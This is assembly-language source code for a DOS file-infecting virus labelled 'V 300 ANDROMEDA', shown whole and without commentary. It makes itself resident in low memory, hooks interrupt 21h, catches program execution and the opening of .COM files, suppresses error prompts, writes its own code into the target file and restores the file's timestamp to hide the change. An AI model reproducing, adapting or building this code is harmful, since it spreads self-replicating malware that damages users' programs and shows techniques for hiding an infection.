;------------------------------------------------------------------------------
;           V 300     ANDROMEDA     <??:??:90>                  *.COM
;------------------------------------------------------------------------------




xseg			segment

			Assume	cs:xseg

xproc			proc	far
			dec	bp
			inc	bp
                        push    ax
			xor	ax,ax
			mov	es,ax
			mov	ax,es:[0535H]
			cmp	ax,454dh
			jz	np
;       Resident        proc    near
			mov	di,535h
			mov	si,100h
			mov	cx,offset len-100h
			cld
			rep	movsb
			mov	ax,offset int21+435h
			xchg	ax,es:[0084h]
			mov	es:[00c8h],ax
			xor	ax,ax
			xchg	ax,es:[0086h]
			mov	es:[00cah],ax

;        Resident       endp
		np:
;        NorProg        proc    near
			push	word ptr ds:[lenpro]
			db	0eah
			dw	offset norprogm+435h
			dw	0000h
;        NorProg        endp

         NorProgM       proc    near
			cld
			mov	di,100h
			pop	si
			add	si,100h
			lea	cx,len-100h
			push	ds
			pop	es
			rep	movsb
			pop	ax
			mov	cs:[p+435h],es
			db	0eah
			dw	100h
		 p:	dw	0000h
	NorProgM	endp

	Int21		proc	near
			push	ax
			push	bx
			push	cx
			push	dx
			push	di
			push	ds
			push	es

                        cmp     ax,4b00h

                        jz      sj
			jmp	ji

		 sj:	mov	ax,offset int24+435h
			xchg	ax,cs:[0090h]
			mov	cs:[o24],ax
			xor	ax,ax
			xchg	ax,cs:[0092h]
			mov	cs:[s24],ax

			mov	ax,3d02h
			int	32h

			jc	jcr

			db	93h

			mov	dx,0bfe5h
			mov	ds,dx
			xor	dx,dx
			lea	cx,len-100h
			mov	ah,3fh
			int	32h

			mov	di,dx
			mov	ax,[di]
			cmp	al,'M'
			jz	j

			mov	ax,4202h
			xor	cx,cx
			int	32h

			or	ah,ah
			jz	j

			mov	cs:[lenpro+435h],ax

			mov	ax,5700h
			int	32h
			push	cx
			push	dx

			xor	dx,dx
			mov	ah,40h
			lea	cx,len-100h
			int	32h

			mov	ax,4200h
			push	cs
			pop	dx
			xor	cx,cx
			int	32h

			push	cs
			pop	ds
			lea	cx,len-100h
			mov	dx,535h
			mov	ah,40h
			int	32h

			pop	dx
			pop	cx
			mov	ax,5701h
			int	32h

		j:	mov	ah,3eh
			int	32h

		jcr:	mov	ax,cs:[o24+435h]
			mov	cs:[0090h],ax
			mov	ax,cs:[s24+435h]
			mov	cs:[0092h],ax
			xor	ax,ax

	ji:		cmp	ah,3dh
			jnz	pr
			push	ds
			pop	es
			push	dx
			pop	di
			mov	cx,40h
			mov	al,'.'
			repnz	scasb
			jnz	pr
			xchg	di,bx
			mov	ax,[bx]
			cmp	ax,'OC'
			jnz	pr1
			jmp	sj
	pr1:		cmp	ax,'oc'
			jnz	pr
			jmp	sj

	pr:		pop	es
			pop	ds
                        pop     di
                        pop     dx
                        pop     cx
                        pop     bx
                        pop     ax
                        jmp     dword ptr cs:[00c8H]
	Int21		endp

	Int24		proc	near
                        mov     al,3
			iret
		s24:	dw	0000h
		o24:	dw	0000h
	int24		endp
	lenpro		dw	0000
	Len		label	byte
xproc			endp
xseg			ends
			end
